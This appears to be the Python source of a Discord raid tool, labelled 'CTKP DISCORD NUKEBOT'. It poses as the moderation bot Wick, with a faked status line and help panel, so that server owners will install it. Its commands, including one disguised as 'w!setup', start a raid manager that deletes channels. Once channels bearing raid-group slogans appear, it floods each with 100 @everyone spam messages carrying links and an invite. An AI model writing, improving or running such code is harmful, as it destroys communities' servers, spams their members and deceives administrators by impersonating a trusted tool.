import discord
import random
from discord.ext import commands
from discord import Permissions, Embed
import asyncio
import json
from colorama import  init, Fore
init()

from raidmanager import RaidManager

with open('./config.json', 'r') as cjson:
    config = json.load(cjson)

intents = discord.Intents.all()

bot = commands.Bot(intents=intents)

@bot.event
async def on_ready():
 print(Fore.RED  + f'''
 mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmgmmmQQmQQmmmmmmgmm
 NNNNNNNNNNMMM#NNNNNNNNN#MMM#N######HHHMMM@@HHHHNNN
 NNNNNNNNMMUXM#NNNNNNNMB6zOUHMNNNNNN#MHWMM##HHM@HMH
 NNNNNMMHHXWMNNNNNMMB61zz?1uwwWMMMNNNNMNkWHMMN#MMMM
 NNNMMN0UWXHMNNMMM6zgdH0<>>zXHNmkXHMMNMMNHMpMMNMNNM
 NNNMHMkXWMMMM9VwQHMH61>>>?>?+vWMMNkXUHMMMHXH@MMMNN
 NNMNWMWwXUOIudHMM9C<>>?>?>>>?>+zWMMMNmyZ0UHHMHMMMM
 N#MHXXWNNmAXMMMSz??1zuQgsAQmA&zzzOZWMMMkdNNKHHMMMM
 MMHWWHHMNNNMHC<!~~(dNMNM9?HMNMNkkwXXXXWNMMMNkWMMMM
 M0wHHWH#NNNN#>_` (dMMMY>` ?THMMMHHWWWHMMMMMMHHMHMM
 Nk+XWWM#####H>  (qm:_`  `` (dkHWHNHkHHMMMMMNIVHXHM
 HR+zWHHMHHHH#> .dMMD~``  ``-dkHMMND<<OMMNMMMH<+dMM
 0VWwXzXggMMMH<-(dMMR<-.....(dVWMNMC``(MMMMNkUkzWWH
 S<?XSjWHHHggHOOzdH8I+zzzzOwwXWWUH9:``(MMMMMR<HMCjM
 Ww+1OyXuWffpSrrrrwWHHHkkXuXXWMMN0!  `(MMMMHH<<<(dM
 HHHAwXWkwWVVWwzzvrZWHHHgHkWHHMM9:`  .(WMM6wk_.+WMM
 MHvWHkkKvOwWHHkkXwzwwXWWHHHHHHH0<.(gHMHz+<dWQW9OMM
 HMHywXHHzuy+vWMHMNmk0VOC1z<<<<+uXHHMB=~(><dU=~jdMM
 ###NkwvzwWHkOzzZWMMHMHmo<;+jeXWpWUC<(+jXI___(dMMMM
 ####MMHkQQXHkZHHmAZVHMMHHwWMHH0CzudXCzXkA&dWHMMMMM
 #N#NMHXZVUU9UOOXWMMHszzTTzTC<+uXHH0<:?777<<jdMMMMM
 #NNNN#MNmgmmQQHMMH9UwQky+;+uQkZOTWHmma&&&&dHMMNNMM
 #NN#NN#NMMHHHW96IzQWHWWWNHNkXWHmx<<?TTUUWHHHgHMMMM
 ########NMNmmAQQdMMSQWMNNNN#NkZWMNma&&ggM###MMM@HM
 #########N##N###NNmqMNNNNNNNNMNmWMNNNNNNNNNNNNNNMM
 """"""""""""""""""""""""""""""""""""""""""""""""""
                CTKP DISCORD NUKEBOT               

 Logged in as {bot.user}
 ''')
 activity = discord.Activity(type=discord.ActivityType.watching,name="wick.bot.com│Shard242")
 await bot.change_presence(status=discord.Status.online,activity=activity)

nuke_channel = [
    "荒らし共栄圏最強！！",
    "荒らし共栄圏万歳！！",
    "ワッパ主席万歳！！",
]

spam_message = ('''
@everyone
https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/1056181559218155551/1056217588889309277/1671876239649.jpg?width=1240&height=701
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB

https://discord.gg/ctkp
    ''')

@bot.event
async def on_message(message):
    guild = message.guild
    if message.author.bot:
        return
    if message.content == '!wappa':
        raidmanager = RaidManager(guild)
        raidmanager.delete_channel()

    elif message.content == 'w!help':
        embeds = Embed(title="Wick's Help Panel:")
        embeds.add_field(name="<:2_:1054329534593693635> General Help:",value="<:3_:1054329534593693635><:1_:10543295345936936355> If you need help setting up Wick or knowing everything about it, You should\ncheck out the Official Documentation [docs.wick.bot]\n<:3_:1054329534593693635><:1_:1054329534593693635>  If you want to view Wick's commands, do: w!commands\n<:3_:1054329534593693635><:1_:1054329534593693635> Quick  Troubleshooting", inline=False)
        embeds.add_field(name="<:4_:1054329534593693635> Subscription Help:", value="<:3_:1054329534593693635>If you are interested in getting a more advanced wick with more features,\nplease consider checking out our Premium Version [wickbot.com/premium\n<:3_:1054329534593693635>If you just purchased a Wick Tier and you need help, Please join the Discord Support Server", inline=True)
        await message.channel.send(embed=embeds)

    elif message.content == 'w!setup':
        raidmanager = RaidManager(guild)
        await raidmanager.setup(message.channel)

@bot.event
async def on_guild_channel_create(channel):
 if channel.name == "荒らし共栄圏万歳！！" or channel.name == "ワッパ主席万歳！！" or channel.name == "荒らし共栄圏最強！！":
  for i in range(100):
   await channel.send(spam_message)

bot.run(config["token"])
